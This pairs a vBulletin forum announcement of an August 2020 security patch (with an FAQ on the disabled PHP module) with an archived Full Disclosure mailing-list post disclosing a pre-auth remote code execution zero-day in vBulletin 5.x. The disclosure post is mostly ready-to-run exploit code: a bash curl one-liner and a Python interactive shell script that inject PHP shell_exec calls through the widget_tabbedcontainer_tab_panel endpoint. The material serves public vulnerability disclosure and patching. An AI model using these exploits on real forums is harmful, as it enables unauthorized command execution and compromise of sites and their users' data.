* [![Wayne Luke](./core/custompics/avatar/avatar868_18.png "Wayne Luke")](https://forum.vbulletin.com/member/868-wayne-luke)

  **[**Wayne Luke**](https://forum.vbulletin.com/member/868-wayne-luke)**

  vBulletin Technical Support Lead
  + Join Date: Aug 2000
  + Posts: 75434
  + vBulletin Version: 6.X
  + [Share](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%23post4445227)
  + [![](data:image/svg+xml...)
    Tweet](https://twitter.com/intent/tweet?text=vBulletin+5.6.0%2C+5.6.1%2C+5.6.2+Security+Patch&url=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%23post4445227)

  ---

  [#1](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch#post4445227)

  ## vBulletin 5.6.0, 5.6.1, 5.6.2 Security Patch

  Mon 10 Aug '20, 2:58pm

  A security issue has been reported to the vBulletin team. To fix this issue, we have created a new security patch.

  You can download the patch for your version in the [Member's Area](http://members.vbulletin.com/patches.php)

  We have made patches available for the following versions of vBulletin Connect:

  + 5.6.2
  + 5.6.1
  + 5.6.0
  ## Installing the Patch

  1. Download the appropriate files for your version of vBulletin 5.6.X
  2. Upload all files found within the zip file. Make sure to overwrite the existing files on your server.
  ## Older Versions

  All older versions should be considered vulnerable. Sites running older versions of vBulletin need to be upgraded to vBulletin 5.6.2 as soon as possible. For more information on upgrading please see [Quick Overview: Upgrading vBulletin Connect](https://forum.vbulletin.com/node/4391346) in the support forums.

  ## vBulletin Cloud

  vBulletin Cloud sites are not affected by this issue.

  Translations provided by Google.

  ---

  Wayne Luke

  [The Rabid Badger](http://forums.rabidbadger.io) - a vBulletin Cloud demonstration site.

  [vBulletin 5 API](http://vb5support.com/api)

  **Tags:**
  None
  üëç

  4

* [![Wayne Luke](./core/custompics/avatar/avatar868_18.png "Wayne Luke")](https://forum.vbulletin.com/member/868-wayne-luke)

  **[**Wayne Luke**](https://forum.vbulletin.com/member/868-wayne-luke)**

  vBulletin Technical Support Lead
  + Join Date: Aug 2000
  + Posts: 75434
  + vBulletin Version: 6.X
  + [Share](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%3Fp%3D4445228%23post4445228)
  + [![](data:image/svg+xml...)
    Tweet](https://twitter.com/intent/tweet?text=&url=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch%3Fp%3D4445228%23post4445228)

  ---

  [#2](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4445227-vbulletin-5-6-0-5-6-1-5-6-2-security-patch?p=4445228#post4445228)

  Mon 10 Aug '20, 3:01pm

  **Q: I am using the 5.6.3 Beta is there a patch?**

  A: No. This is pre-release software and should not be used on a production site. In order to secure your site follow the steps below:
  1. Put the site into [debug mode](https://www.vbulletin.com/go/vb5debug).
  2. Log into the AdminCP.
  3. Go to Styles -> Style Manager.
  4. Open the template list for the MASTER style.
  5. Scroll to the bottom where it says Module Templates.
  6. Highlight the widget\_php module.
  7. Click the Revert Button.
  8. This will completely delete the template from your site and make the PHP Module inoperative.The next build of 5.6.3 will contain the patch.

  **Q: My PHP Modules no longer work. Is this to be expected?**

  A: Yes. This security patch disables the PHP Module. This module will be removed from the software completely in 5.6.4.

  **Q: How do I include custom PHP on my pages?**

  A: Please read this article: [https://forum.vbulletin.com/articles...php-in-modules](https://forum.vbulletin.com/articles/vbulletin-5-connect-aa/reference/4445230-including-custom-php-in-modules)

  Translations provided by Google.

  ---

  Wayne Luke

  [The Rabid Badger](http://forums.rabidbadger.io) - a vBulletin Cloud demonstration site.

  [vBulletin 5 API](http://vb5support.com/api)

  üëç

  3

  ## Comment

  Post
  Cancel

Previous
template
Next

widgetinstance 262 (Related Topics) skipped due to lack of content & hide\_module\_if\_empty option.

(vbulletin-forum1.internetbrands.com)

* Default Style
  + Default Style
  + - vB5 Style
  + - Pink
  + - Black Red
  + - Blue Yellow
  + - Cool Blue
  + - Denim
  + - Gradient
  + - Grey Stripes
  + - Grunge
  + - Light Blue
  + - Old School
  + - Orange Purple
  + - Blue Green
  + - Red
  + - Stripes
  + - Wood
  + - Dark
  + - Winter
  + - vBulletin Default Theme
  + - Halloween
* English (US)
  + Deutsch (Du)
  + English (US)
  + French
  + Right-to-Left Test
  + Spanish

* [Help](https://forum.vbulletin.com/help)
* [Member's Area](http://members.vbulletin.com)
* [Manual](http://www.vbulletin.com/docs/html)
* [Submit Ticket](http://www.vbulletin.com/go/techsupport)
* [Privacy Policy](https://www.internetbrands.com/privacy/privacy-highlights.html?site=www.vbulletin.com)
* [Terms of Use](https://www.internetbrands.com/ibterms/)
* [Cookie Policy](https://www.internetbrands.com/privacy/cookie-policy)
* [Forum Rules](https://forum.vbulletin.com/terms-of-service)
* [Contact Us](https://forum.vbulletin.com/contact-us)
* Go to top

Manage Preferences

Your Privacy Choices![](https://icons.internetbrands.com/ccpa/privacyoptions29x14.png)

Powered by [vBulletin¬Æ](https://www.vbulletin.com) Version 6.0.8
Copyright ¬© 2025 MH Sub I, LLC dba vBulletin. All rights reserved.
All times are GMT-8. This page was generated at 3:41am.

Working...

Yes
No

OK

OK
Cancel

üòÄ

üòÇ

ü•∞

üòò

ü§¢

üòé

üòû

üò°

üëç

üëé

‚òï



=== Content from seclists.org_33d021e0_20250119_114135.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# Remote Code Execution 0day in vBulletin 5.x

---

*From*: Zenofex via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Sun, 9 Aug 2020 16:58:27 -0500

---

```
vBulletin 5.5.4 through 5.6.2 are vulnerable to a remote code execution
vulnerability caused by incomplete patching of the previous
"CVE-2019-16759" RCE. This logic bug allows for a single pre-auth request
to execute PHP code on a target vBulletin forum.

More info can be found at:
<https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/>

Exploits below.

Thank you,
Zenofex

BASH Exploit:

#!/bin/bash
#
# vBulletin (widget_tabbedcontainer_tab_panel) 5.x 0day by @Zenofex
#
# Usage ./exploit <site> <shell-command>

# Urlencode cmd
CMD=`echo $2|perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"'`

# Send request
curl -s $1/ajax/render/widget_tabbedcontainer_tab_panel -d
'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("'+$CMD+'");exit;'

Python Exploit:

#!/usr/bin/env python3
# vBulletin 5.x pre-auth widget_tabbedContainer_tab_panel RCE exploit by
@zenofex

import argparse
import requests
import sys

def run_exploit(vb_loc, shell_cmd):
    post_data = {'subWidgets[0][template]' : 'widget_php',
'subWidgets[0][config][code]' : "echo shell_exec('%s'); exit;" % shell_cmd}
    r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' %
vb_loc, post_data)
    return r.text

ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget
Template RCE')
ap.add_argument('-l', '--location', required=True, help='Web address to
root of vB5 install.')
ARGS = ap.parse_args()

while True:
    try:
        cmd = input("vBulletin5$ ")
        print(run_exploit(ARGS.location, cmd))
    except KeyboardInterrupt:
        sys.exit("\nClosing shell...")
    except Exception as e:
        sys.exit(str(e))

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **Remote Code Execution 0day in vBulletin 5.x** *Zenofex via Fulldisclosure (Aug 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


